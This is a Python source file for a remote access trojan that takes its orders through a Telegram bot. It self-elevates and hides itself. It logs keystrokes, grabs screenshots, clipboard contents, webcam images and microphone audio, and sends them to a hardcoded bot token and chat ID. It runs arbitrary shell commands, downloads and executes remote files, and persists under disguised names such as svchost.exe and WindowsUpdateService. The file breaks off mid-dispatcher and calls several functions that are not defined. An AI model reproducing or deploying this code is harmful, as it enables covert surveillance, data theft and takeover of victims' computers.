import os
import sys
import time
import json
import subprocess
import threading
import platform
import shutil
import tempfile
import base64
import socket
import struct
from datetime import datetime

# ---------- PLATFORM DETECTION ----------
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
IS_MAC = platform.system() == "Darwin"

# ---------- AUTO-ELEVATE ----------
def is_admin():
    if IS_WINDOWS:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.geteuid() == 0

def elevate():
    if not is_admin():
        if IS_WINDOWS:
            try:
                import ctypes
                script = os.path.abspath(sys.argv[0])
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
                sys.exit(0)
            except:
                pass
        else:
            try:
                subprocess.run(['sudo', sys.executable] + sys.argv, check=False)
                sys.exit(0)
            except:
                pass

# ---------- DAEMONIZE ----------
def daemonize():
    if IS_WINDOWS:
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    else:
        try:
            if os.fork() > 0:
                os._exit(0)
            os.setsid()
            if os.fork() > 0:
                os._exit(0)
            os.umask(0)
            sys.stdin.close()
            sys.stdout.close()
            sys.stderr.close()
        except:
            pass

# ---------- AUTO-INSTALL DEPENDENCIES ----------
def install_package(pkg):
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", pkg], capture_output=True, timeout=120)
    except:
        pass

def safe_import(module_name, pip_name=None):
    if pip_name is None:
        pip_name = module_name
    try:
        return __import__(module_name)
    except ImportError:
        install_package(pip_name)
        try:
            return __import__(module_name)
        except ImportError:
            return None

# ---------- IMPORTS ----------
requests = safe_import("requests")
PIL = safe_import("PIL", "Pillow")
pyscreenshot = safe_import("pyscreenshot")
if pyscreenshot is not None:
    def grab_screen():
        return pyscreenshot.grab()
else:
    mss = safe_import("mss")
    if mss is not None:
        def grab_screen():
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                return sct.grab(monitor)
    else:
        if IS_WINDOWS:
            from PIL import ImageGrab
            def grab_screen():
                return ImageGrab.grab()
        else:
            def grab_screen():
                temp_path = os.path.join(tempfile.gettempdir(), "scr.png")
                try:
                    if shutil.which("scrot"):
                        subprocess.run(["scrot", temp_path], check=True, timeout=5)
                        from PIL import Image
                        return Image.open(temp_path)
                    elif shutil.which("import"):
                        subprocess.run(["import", "-window", "root", temp_path], check=True, timeout=5)
                        from PIL import Image
                        return Image.open(temp_path)
                    else:
                        return None
                except:
                    return None

cv2 = safe_import("cv2", "opencv-python")
pyaudio = safe_import("pyaudio")
pynput = safe_import("pynput")
pyperclip = safe_import("pyperclip")

# ---------- TELEGRAM CREDENTIALS ----------
BOT_TOKEN = "8808768825:AAG46x-DBF4HVVujTELCDkW7jzUHDdcX0xY"
CHAT_ID   = "6504480358"
HEARTBEAT_INTERVAL = 3600  # 1 hour to avoid spam
LAST_HEARTBEAT = 0
heartbeat_running = True

LOG_FILE = os.path.join(tempfile.gettempdir(), "rat_log.txt")
def log_error(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()}: {msg}\n")
    except:
        pass

# ---------- TELEGRAM WRAPPERS WITH INLINE KEYBOARD ----------
def tg_send_message(text, reply_markup=None):
    if requests is None:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception as e:
        log_error(f"tg_send: {e}")

def tg_send_photo(photo_path, caption="", reply_markup=None):
    if requests is None or not os.path.exists(photo_path):
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(photo_path, "rb") as f:
            files = {"photo": f}
            data = {"chat_id": CHAT_ID, "caption": caption}
            if reply_markup:
                data["reply_markup"] = json.dumps(reply_markup)
            requests.post(url, files=files, data=data, timeout=15)
    except Exception as e:
        log_error(f"tg_photo: {e}")

def tg_send_document(file_path, caption="", reply_markup=None):
    if requests is None or not os.path.exists(file_path):
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": CHAT_ID, "caption": caption}
            if reply_markup:
                data["reply_markup"] = json.dumps(reply_markup)
            requests.post(url, files=files, data=data, timeout=15)
    except Exception as e:
        log_error(f"tg_doc: {e}")

def tg_send_audio(audio_path, caption="", reply_markup=None):
    if requests is None or not os.path.exists(audio_path):
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
    try:
        with open(audio_path, "rb") as f:
            files = {"audio": f}
            data = {"chat_id": CHAT_ID, "caption": caption}
            if reply_markup:
                data["reply_markup"] = json.dumps(reply_markup)
            requests.post(url, files=files, data=data, timeout=15)
    except Exception as e:
        log_error(f"tg_audio: {e}")

def tg_get_updates(offset=None):
    if requests is None:
        return []
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30, "allowed_updates": ["message", "callback_query"]}
    if offset:
        params["offset"] = offset
    try:
        resp = requests.get(url, params=params, timeout=35)
        if resp.status_code == 200:
            return resp.json().get("result", [])
    except Exception as e:
        log_error(f"tg_get: {e}")
    return []

# ---------- INLINE KEYBOARD BUILDER ----------
def main_menu_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📸 Screenshot", "callback_data": "menu_screenshot"},
             {"text": "🖥️ System Info", "callback_data": "menu_info"}],
            [{"text": "⌨️ Keylogger", "callback_data": "menu_keylogger"},
             {"text": "📋 Clipboard", "callback_data": "menu_clipboard"}],
            [{"text": "📷 Webcam", "callback_data": "menu_webcam"},
             {"text": "🎤 Microphone", "callback_data": "menu_mic"}],
            [{"text": "📂 File Manager", "callback_data": "menu_file"},
             {"text": "⚙️ Process Control", "callback_data": "menu_process"}],
            [{"text": "🔄 Persistence", "callback_data": "menu_persist"},
             {"text": "🚀 Run/Download", "callback_data": "menu_run"}],
            [{"text": "🛑 Shutdown/Reboot", "callback_data": "menu_power"},
             {"text": "💀 Self-Destruct", "callback_data": "menu_kill"}],
            [{"text": "❓ Help", "callback_data": "menu_help"}]
        ]
    }

def keylogger_menu():
    return {
        "inline_keyboard": [
            [{"text": "▶️ Start", "callback_data": "keylog_start"},
             {"text": "⏹️ Stop & Send", "callback_data": "keylog_stop"}],
            [{"text": "📤 Dump Log", "callback_data": "keylog_dump"},
             {"text": "📊 Status", "callback_data": "keylog_status"}],
            [{"text": "🔙 Back", "callback_data": "menu_main"}]
        ]
    }

def clipboard_menu():
    return {
        "inline_keyboard": [
            [{"text": "📤 Get Clipboard", "callback_data": "clip_get"}],
            [{"text": "📥 Set Clipboard", "callback_data": "clip_set"}],
            [{"text": "🔙 Back", "callback_data": "menu_main"}]
        ]
    }

def webcam_menu():
    return {
        "inline_keyboard": [
            [{"text": "📸 Capture (auto)", "callback_data": "webcam_cap"}],
            [{"text": "📋 List Devices", "callback_data": "webcam_list"}],
            [{"text": "🔙 Back", "callback_data": "menu_main"}]
        ]
    }

def power_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔒 Lock", "callback_data": "power_lock"},
             {"text": "⏹️ Shutdown", "callback_data": "power_shutdown"}],
            [{"text": "🔄 Reboot", "callback_data": "power_reboot"}],
            [{"text": "🔙 Back", "callback_data": "menu_main"}]
        ]
    }

def process_menu():
    return {
        "inline_keyboard": [
            [{"text": "📋 List Processes", "callback_data": "proc_list"}],
            [{"text": "💀 Kill Process", "callback_data": "proc_kill"}],
            [{"text": "🔙 Back", "callback_data": "menu_main"}]
        ]
    }

def file_menu():
    return {
        "inline_keyboard": [
            [{"text": "📂 List Directory", "callback_data": "file_ls"}],
            [{"text": "📤 Upload File", "callback_data": "file_upload"}],
            [{"text": "📥 Download from URL", "callback_data": "file_download"}],
            [{"text": "🔙 Back", "callback_data": "menu_main"}]
        ]
    }

def run_menu():
    return {
        "inline_keyboard": [
            [{"text": "🚀 Run URL", "callback_data": "run_url"}],
            [{"text": "🔙 Back", "callback_data": "menu_main"}]
        ]
    }

# ---------- CORE FUNCTIONS ----------
def take_screenshot():
    img = grab_screen()
    if img is None:
        return None
    temp_path = os.path.join(tempfile.gettempdir(), "scr.png")
    try:
        img.save(temp_path)
        return temp_path
    except:
        return None

def execute_cmd(command):
    try:
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0
        )
        stdout, stderr = proc.communicate(timeout=60)
        output = stdout.decode("utf-8", errors="ignore") + stderr.decode("utf-8", errors="ignore")
        return output if output.strip() else "[Command executed with no output]"
    except Exception as e:
        log_error(f"cmd: {e}")
        return f"Error: {str(e)}"

def upload_file(local_path):
    if os.path.isfile(local_path):
        tg_send_document(local_path, f"File: {os.path.basename(local_path)}", reply_markup=main_menu_keyboard())
        return "File sent."
    return "File not found."

def download_file(url, save_path):
    if requests is None:
        return "Requests not available"
    try:
        r = requests.get(url, stream=True, timeout=30)
        with open(save_path, "wb") as f:
            for chunk in r.iter_content(1024):
                f.write(chunk)
        return f"Downloaded to {save_path}"
    except Exception as e:
        log_error(f"download: {e}")
        return f"Download failed: {str(e)}"

def run_downloaded_exe(url, args=""):
    temp_dir = tempfile.gettempdir()
    name = os.path.basename(url.split("?")[0])
    if not name:
        name = "temp_run"
    path = os.path.join(temp_dir, name)
    dl = download_file(url, path)
    if "failed" in dl.lower():
        return dl
    if not IS_WINDOWS:
        os.chmod(path, 0o755)
    try:
        if IS_WINDOWS:
            subprocess.Popen([path] + (args.split() if args else []), creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.Popen([path] + (args.split() if args else []))
        return f"Executed {path}"
    except Exception as e:
        return f"Execution failed: {str(e)}"

def get_system_info():
    info = f"<b>Hostname:</b> {platform.node()}\n"
    info += f"<b>OS:</b> {platform.system()} {platform.release()}\n"
    info += f"<b>Arch:</b> {platform.machine()}\n"
    info += f"<b>User:</b> {os.getenv('USER') or os.getenv('USERNAME') or 'unknown'}\n"
    try:
        if IS_WINDOWS:
            boot = os.popen('systeminfo | find "System Boot Time"').read().strip()
        else:
            boot = os.popen('uptime -p').read().strip()
        info += f"<b>Uptime:</b> {boot}\n"
    except:
        pass
    return info

def get_clipboard_text():
    if pyperclip is None:
        return "pyperclip not installed"
    try:
        return pyperclip.paste()
    except Exception as e:
        log_error(f"clipboard: {e}")
        return f"Clipboard error: {str(e)}"

def set_clipboard_text(text):
    if pyperclip is None:
        return "pyperclip not installed"
    try:
        pyperclip.copy(text)
        return "Clipboard set."
    except Exception as e:
        return f"Failed: {str(e)}"

# ---------- KEYLOGGER ----------
keylog_data = []
keylog_running = False
keylog_listener = None

def on_press(key):
    global keylog_data
    try:
        if hasattr(key, 'char') and key.char is not None:
            keylog_data.append(key.char)
        else:
            special = {
                'Key.space': ' ',
                'Key.enter': '\n',
                'Key.tab': '\t',
                'Key.backspace': '[BACKSPACE]',
                'Key.shift': '[SHIFT]',
                'Key.ctrl': '[CTRL]',
                'Key.alt': '[ALT]',
                'Key.cmd': '[WIN/CMD]',
                'Key.esc': '[ESC]',
                'Key.up': '[UP]',
                'Key.down': '[DOWN]',
                'Key.left': '[LEFT]',
                'Key.right': '[RIGHT]',
                'Key.f1': '[F1]','Key.f2': '[F2]','Key.f3': '[F3]','Key.f4': '[F4]',
                'Key.f5': '[F5]','Key.f6': '[F6]','Key.f7': '[F7]','Key.f8': '[F8]',
                'Key.f9': '[F9]','Key.f10': '[F10]','Key.f11': '[F11]','Key.f12': '[F12]',
            }
            key_str = str(key)
            if key_str in special:
                keylog_data.append(special[key_str])
            else:
                keylog_data.append(f'[{key_str}]')
    except:
        pass

def start_keylogger():
    global keylog_running, keylog_listener, keylog_data
    if keylog_running:
        return "Keylogger already running."
    if pynput is None:
        return "pynput not installed."
    try:
        from pynput.keyboard import Listener
        keylog_data = []
        keylog_listener = Listener(on_press=on_press)
        keylog_listener.start()
        keylog_running = True
        return "Keylogger started."
    except Exception as e:
        log_error(f"start_keylogger: {e}")
        return f"Failed: {str(e)}"

def stop_keylogger(send_log=True):
    global keylog_running, keylog_listener, keylog_data
    if not keylog_running:
        return "Keylogger not running."
    try:
        if keylog_listener is not None:
            keylog_listener.stop()
            keylog_listener = None
        keylog_running = False
        if send_log and keylog_data:
            log_path = os.path.join(tempfile.gettempdir(), "keylog.txt")
            with open(log_path, "w", encoding="utf-8") as f:
                f.write(''.join(keylog_data))
            tg_send_document(log_path, "Keylog dump", reply_markup=main_menu_keyboard())
            os.remove(log_path)
            keylog_data = []
        return "Keylogger stopped."
    except Exception as e:
        log_error(f"stop_keylogger: {e}")
        return f"Failed: {str(e)}"

def dump_keylog():
    if not keylog_running:
        return "Keylogger not running."
    if not keylog_data:
        return "No keystrokes yet."
    log_path = os.path.join(tempfile.gettempdir(), "keylog_dump.txt")
    with open(log_path, "w", encoding="utf-8") as f:
        f.write(''.join(keylog_data))
    tg_send_document(log_path, "Keylog current dump", reply_markup=main_menu_keyboard())
    os.remove(log_path)
    return "Keylog dump sent."

# ---------- WEBCAM ----------
def capture_webcam(index=0):
    if cv2 is not None:
        try:
            cap = cv2.VideoCapture(index, cv2.CAP_DSHOW if IS_WINDOWS else cv2.CAP_ANY)
            if cap.isOpened():
                ret, frame = cap.read()
                cap.release()
                if ret and frame is not None:
                    temp_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
                    cv2.imwrite(temp_path, frame)
                    return temp_path, None
            backends = [cv2.CAP_MSMF, cv2.CAP_V4L2, cv2.CAP_V4L, cv2.CAP_FFMPEG, cv2.CAP_GSTREAMER]
            for backend in backends:
                try:
                    cap = cv2.VideoCapture(index, backend)
                    if cap.isOpened():
                        ret, frame = cap.read()
                        cap.release()
                        if ret and frame is not None:
                            temp_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
                            cv2.imwrite(temp_path, frame)
                            return temp_path, None
                except:
                    continue
        except Exception as e:
            log_error(f"webcam cv2: {e}")
    if IS_LINUX:
        temp_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
        try:
            cmd = ["ffmpeg", "-f", "v4l2", "-i", f"/dev/video{index}", "-frames:v", "1", temp_path, "-y"]
            subprocess.run(cmd, check=True, timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if os.path.exists(temp_path) and os.path.getsize(temp_path) > 0:
                return temp_path, None
        except:
            pass
        try:
            cmd = ["v4l2-ctl", "-d", f"/dev/video{index}", "--set-fmt-video=width=640,height=480,pixelformat=MJPEG", "--stream-mmap", "--stream-count=1", "--stream-to", temp_path]
            subprocess.run(cmd, check=True, timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if os.path.exists(temp_path) and os.path.getsize(temp_path) > 0:
                out = temp_path + ".jpg"
                subprocess.run(["ffmpeg", "-i", temp_path, "-frames:v", "1", out, "-y"], check=True, timeout=5)
                os.remove(temp_path)
                if os.path.exists(out):
                    return out, None
        except:
            pass
    elif IS_MAC:
        temp_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
        try:
            subprocess.run(["imagesnap", temp_path], check=True, timeout=10)
            if os.path.exists(temp_path) and os.path.getsize(temp_path) > 0:
                return temp_path, None
        except:
            pass
    if IS_WINDOWS:
        temp_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
        try:
            cmd = ["ffmpeg", "-f", "dshow", "-i", "video=Integrated Camera", "-frames:v", "1", temp_path, "-y"]
            subprocess.run(cmd, check=True, timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if os.path.exists(temp_path) and os.path.getsize(temp_path) > 0:
                return temp_path, None
        except:
            pass
    return None, "All webcam capture methods failed"

def list_webcams():
    devices = []
    if IS_WINDOWS:
        try:
            result = subprocess.run(["ffmpeg", "-f", "dshow", "-list_devices", "true", "-i", "dummy"], capture_output=True, text=True, timeout=10)
            for line in result.stderr.splitlines():
                if 'DirectShow video devices' in line:
                    continue
                if '"' in line and 'video' in line.lower():
                    devices.append(line.strip())
        except:
            pass
    elif IS_LINUX:
        try:
            for dev in os.listdir('/dev'):
                if dev.startswith('video'):
                    devices.append(f"/dev/{dev}")
        except:
            pass
    elif IS_MAC:
        try:
            result = subprocess.run(["system_profiler", "SPCameraDataType"], capture_output=True, text=True, timeout=10)
            for line in result.stdout.splitlines():
                if "Model" in line or "Name" in line:
                    devices.append(line.strip())
        except:
            pass
    return devices if devices else ["No webcams found"]

# ---------- AUDIO ----------
def record_audio(duration=10, sample_rate=16000, channels=1):
    if pyaudio is None:
        return None, "pyaudio not installed"
    try:
        import pyaudio
        import wave
        temp_wav = os.path.join(tempfile.gettempdir(), "audio.wav")
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16,
                        channels=channels,
                        rate=sample_rate,
                        input=True,
                        frames_per_buffer=1024)
        frames = []
        for _ in range(0, int(sample_rate / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(temp_wav, 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(sample_rate)
        wf.writeframes(b''.join(frames))
        wf.close()
        return temp_wav, None
    except Exception as e:
        log_error(f"record_audio: {e}")
        return None, str(e)

# ---------- WALLPAPER ----------
def set_wallpaper(image_path):
    if not os.path.exists(image_path):
        return "Image not found"
    try:
        if IS_WINDOWS:
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
            return "Wallpaper changed."
        elif IS_LINUX:
            if shutil.which("gsettings"):
                subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{image_path}"], timeout=5)
                return "Wallpaper changed (GNOME)."
            elif shutil.which("feh"):
                subprocess.run(["feh", "--bg-scale", image_path], timeout=5)
                return "Wallpaper changed (feh)."
            else:
                return "No wallpaper tool found"
        elif IS_MAC:
            script = f'''tell application "System Events"
                tell every desktop
                    set picture to "{image_path}"
                end tell
            end tell'''
            subprocess.run(["osascript", "-e", script], timeout=5)
            return "Wallpaper changed (macOS)."
        else:
            return "Unsupported OS"
    except Exception as e:
        return f"Failed: {str(e)}"

# ---------- PERSISTENCE ----------
def get_rat_path():
    if IS_WINDOWS:
        dest_dir = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "System")
        dest = os.path.join(dest_dir, "svchost.exe")
    elif IS_LINUX:
        dest_dir = os.path.join(os.environ.get("HOME", ""), ".local", "bin")
        dest = os.path.join(dest_dir, "systemd-helper")
    else:
        dest_dir = os.path.join(os.environ.get("HOME", ""), "Library", "Application Support", "com.apple.helper")
        dest = os.path.join(dest_dir, "helper")
    try:
        os.makedirs(dest_dir, exist_ok=True)
        src = sys.executable if getattr(sys, 'frozen', False) else __file__
        if os.path.abspath(src) != os.path.abspath(dest):
            shutil.copy2(src, dest)
            if IS_WINDOWS:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(dest, 2)
            else:
                os.chmod(dest, 0o755)
        return dest
    except Exception as e:
        log_error(f"copy_self: {e}")
        return sys.executable if getattr(sys, 'frozen', False) else __file__

def add_persistence():
    exe = get_rat_path()
    results = []
    if IS_WINDOWS:
        try:
            import winreg
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, exe)
            results.append("Registry (HKCU)")
        except:
            pass
        try:
            subprocess.run(f'schtasks /create /tn "WindowsUpdateService" /tr "{exe}" /sc onlogon /ru SYSTEM /rl HIGHEST /f', shell=True, capture_output=True, timeout=10)
            results.append("Scheduled task")
        except:
            pass
        startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if os.path.exists(startup):
            try:
                import pythoncom
                from win32com.client import Dispatch
                shell = Dispatch("WScript.Shell")
                shortcut = shell.CreateShortCut(os.path.join(startup, "WindowsUpdateService.lnk"))
                shortcut.TargetPath = exe
                shortcut.save()
                results.append("Startup folder")
            except:
                pass
    else:
        try:
            cron_line = f"@reboot {exe} >/dev/null 2>&1"
            current = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
            new_cron = current.stdout + "\n" + cron_line + "\n" if current.stdout else cron_line + "\n"
            subprocess.run(["crontab", "-"], input=new_cron, text=True, timeout=5)
            results.append("Cron @reboot")
        except:
            pass
        if IS_LINUX:
            try:
                service_path = os.path.join(os.environ.get("HOME", ""), ".config", "systemd", "user", "helper.service")
                os.makedirs(os.path.dirname(service_path), exist_ok=True)
                service_content = f"""[Unit]
Description=Helper
After=network.target

[Service]
ExecStart={exe}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
                with open(service_path, "w") as f:
                    f.write(service_content)
                subprocess.run(["systemctl", "--user", "daemon-reload"], timeout=5)
                subprocess.run(["systemctl", "--user", "enable", "helper.service"], timeout=5)
                subprocess.run(["systemctl", "--user", "start", "helper.service"], timeout=5)
                results.append("systemd user service")
            except:
                pass
        if IS_MAC:
            try:
                plist_path = os.path.join(os.environ.get("HOME", ""), "Library", "LaunchAgents", "com.helper.plist")
                plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
                with open(plist_path, "w") as f:
                    f.write(plist)
                subprocess.run(["launchctl", "load", plist_path], timeout=5)
                results.append("launchd")
            except:
                pass
    return "Persistence added: " + ", ".join(results) if results else "Persistence failed."

def remove_persistence():
    if IS_WINDOWS:
        try:
            import winreg
            for hive in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                try:
                    with winreg.OpenKey(hive, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as regkey:
                        winreg.DeleteValue(regkey, "WindowsUpdateService")
                except:
                    pass
        except:
            pass
        subprocess.run('schtasks /delete /tn "WindowsUpdateService" /f', shell=True, capture_output=True)
        startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdateService.lnk")
        if os.path.exists(startup):
            os.remove(startup)
    else:
        try:
            current = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
            lines = current.stdout.splitlines()
            new_lines = [line for line in lines if "helper" not in line and "svchost" not in line and "systemd-helper" not in line]
            subprocess.run(["crontab", "-"], input="\n".join(new_lines), text=True, timeout=5)
        except:
            pass
        if IS_LINUX:
            try:
                subprocess.run(["systemctl", "--user", "stop", "helper.service"], timeout=5)
                subprocess.run(["systemctl", "--user", "disable", "helper.service"], timeout=5)
                service_path = os.path.join(os.environ.get("HOME", ""), ".config", "systemd", "user", "helper.service")
                if os.path.exists(service_path):
                    os.remove(service_path)
                subprocess.run(["systemctl", "--user", "daemon-reload"], timeout=5)
            except:
                pass
        if IS_MAC:
            try:
                plist_path = os.path.join(os.environ.get("HOME", ""), "Library", "LaunchAgents", "com.helper.plist")
                if os.path.exists(plist_path):
                    subprocess.run(["launchctl", "unload", plist_path], timeout=5)
                    os.remove(plist_path)
            except:
                pass

# ---------- SELF-DESTRUCT ----------
def kill_self():
    global heartbeat_running
    heartbeat_running = False
    remove_persistence()
    try:
        if getattr(sys, 'frozen', False):
            os.remove(sys.executable)
    except:
        pass
    os._exit(0)

# ---------- HEARTBEAT (throttled) ----------
def heartbeat_loop():
    global LAST_HEARTBEAT
    while heartbeat_running:
        now = time.time()
        if now - LAST_HEARTBEAT >= HEARTBEAT_INTERVAL:
            try:
                tg_send_message(f"🟢 <b>HEARTBEAT</b> - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", reply_markup=main_menu_keyboard())
                LAST_HEARTBEAT = now
            except:
                pass
        time.sleep(60)  # check every minute

# ---------- COMMAND PROCESSOR ----------
def process_command(cmd_text):
    cmd_text = cmd_text.strip()
    if not cmd_text:
        return
    parts = cmd_text.split(maxsplit=1)
    command = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if command == "/screenshot" or command == "screenshot":
        path = take_screenshot()
        if path:
            tg_send_photo(path, "📸 Screenshot", reply_markup=main_menu_keyboard())
            os.remove(path)
        else:
            tg_send_message("Screenshot failed.", reply_markup=main_menu_keyboard())

    elif command == "/cmd" or command == "cmd":
        if not arg:
            tg_send_message("Usage: /cmd <command>", reply_markup=main_menu_keyboard())
            return
        output = execute_cmd(arg)
        if len(output) > 4000:
            output = output[:4000] + "\n...truncated"
        tg_send_message(f"<b>CMD output:</b>\n<code>{output}</code>", reply_markup=main_menu_keyboard())

    elif command == "/upload" or command == "upload":
        if not arg:
            tg_send_message("Usage: /upload <path>", reply_markup=main_menu_keyboard())
            return
        result = upload_file(arg)
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/download" or command == "download":
        if not arg:
            tg_send_message("Usage: /download <URL> <save_path>", reply_markup=main_menu_keyboard())
            return
        parts = arg.split(maxsplit=1)
        url = parts[0]
        save = parts[1] if len(parts)>1 else os.path.basename(url)
        result = download_file(url, save)
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/info" or command == "info":
        info = get_system_info()
        tg_send_message(info, reply_markup=main_menu_keyboard())

    elif command == "/persist" or command == "persist":
        result = add_persistence()
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/popup" or command == "popup":
        if not arg:
            tg_send_message("Usage: /popup <message>", reply_markup=main_menu_keyboard())
            return
        result = show_popup(arg)
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/clipboard" or command == "clipboard":
        text = get_clipboard_text()
        if len(text) > 4000:
            text = text[:4000] + "\n...truncated"
        tg_send_message(f"<b>Clipboard:</b>\n<code>{text}</code>", reply_markup=main_menu_keyboard())

    elif command == "/clipboard_set" or command == "clipboard_set":
        if not arg:
            tg_send_message("Usage: /clipboard_set <text>", reply_markup=main_menu_keyboard())
            return
        result = set_clipboard_text(arg)
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/keylog_start" or command == "keylog_start":
        result = start_keylogger()
        tg_send_message(result, reply_markup=keylogger_menu())

    elif command == "/keylog_stop" or command == "keylog_stop":
        result = stop_keylogger(send_log=True)
        tg_send_message(result, reply_markup=keylogger_menu())

    elif command == "/keylog_dump" or command == "keylog_dump":
        result = dump_keylog()
        tg_send_message(result, reply_markup=keylogger_menu())

    elif command == "/keylog_status" or command == "keylog_status":
        status = "Running" if keylog_running else "Stopped"
        count = len(keylog_data)
        tg_send_message(f"Keylogger status: {status}, keystrokes captured: {count}", reply_markup=keylogger_menu())

    elif command == "/webcam" or command == "webcam":
        for idx in [0,1,2]:
            path, err = capture_webcam(idx)
            if path:
                tg_send_photo(path, f"📷 Webcam (index {idx})", reply_markup=main_menu_keyboard())
                os.remove(path)
                return
        tg_send_message(f"Webcam failed: {err if 'err' in locals() else 'all indices failed'}", reply_markup=main_menu_keyboard())

    elif command == "/webcam_list" or command == "webcam_list":
        devs = list_webcams()
        tg_send_message("Webcams:\n" + "\n".join(devs), reply_markup=main_menu_keyboard())

    elif command == "/mic" or command == "mic":
        path, err = record_audio(duration=10)
        if path:
            tg_send_audio(path, "🎤 Audio recording (10s)", reply_markup=main_menu_keyboard())
            os.remove(path)
        else:
            tg_send_message(f"Audio failed: {err}", reply_markup=main_menu_keyboard())

    elif command == "/wallpaper" or command == "wallpaper":
        if not arg:
            tg_send_message("Usage: /wallpaper <image_path_or_url>", reply_markup=main_menu_keyboard())
            return
        if arg.startswith("http"):
            temp_img = os.path.join(tempfile.gettempdir(), "wallpaper.jpg")
            dl = download_file(arg, temp_img)
            if "failed" in dl.lower():
                tg_send_message(dl, reply_markup=main_menu_keyboard())
                return
            img_path = temp_img
        else:
            img_path = arg
        result = set_wallpaper(img_path)
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/run" or command == "run":
        if not arg:
            tg_send_message("Usage: /run <URL> [args]", reply_markup=main_menu_keyboard())
            return
        parts = arg.split(maxsplit=1)
        url = parts[0]
        args = parts[1] if len(parts)>1 else ""
        result = run_downloaded_exe(url, args)
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/location" or command == "location":
        loc = get_location()
        tg_send_message(f"<b>Location:</b>\n<code>{loc}</code>", reply_markup=main_menu_keyboard())

    elif command == "/lock" or command == "lock":
        result = lock_workstation()
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/shutdown" or command == "shutdown":
        result = shutdown_pc()
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/reboot" or command == "reboot":
        result = reboot_pc()
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/ls" or command == "ls":
        dir_path = arg if arg else "."
        result = list_directory(dir_path)
        if len(result) > 4000:
            result = result[:4000] + "\n...truncated"
        tg_send_message(f"<b>Directory listing:</b>\n<code>{result}</code>", reply_markup=main_menu_keyboard())

    elif command == "/ps" or command == "ps":
        result = list_processes()
        if len(result) > 4000:
            result = result[:4000] + "\n...truncated"
        tg_send_message(f"<b>Processes:</b>\n<code>{result}</code>", reply_markup=main_menu_keyboard())

